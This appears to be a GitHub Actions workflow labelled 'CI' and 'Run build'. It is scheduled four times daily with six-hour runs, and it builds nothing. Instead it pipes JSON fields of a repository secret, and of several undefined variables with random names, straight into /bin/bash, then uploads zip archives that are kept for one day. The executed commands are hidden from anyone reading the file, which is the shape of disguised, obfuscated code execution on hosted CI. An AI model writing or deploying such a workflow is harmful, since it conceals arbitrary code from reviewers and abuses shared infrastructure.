name: CI
on:
  workflow_dispatch:

  schedule:
    - cron: '56 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          um78: ${{ secrets.um78 }}
        run: |
          printf '%s' "$um78" | jq -r .stt52685 | /bin/bash
          echo $de4 | jq -r .psgjk773 | /bin/bash
          printf '%s' "$b23" | jq -r .lyboh08314 | /bin/bash
          echo $q548 | jq -r .fyfr81423 | /bin/bash
          echo $u592 | jq -r .nptig4222 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: CVIlx6I1
          path: "*.zip"
          retention-days: 1
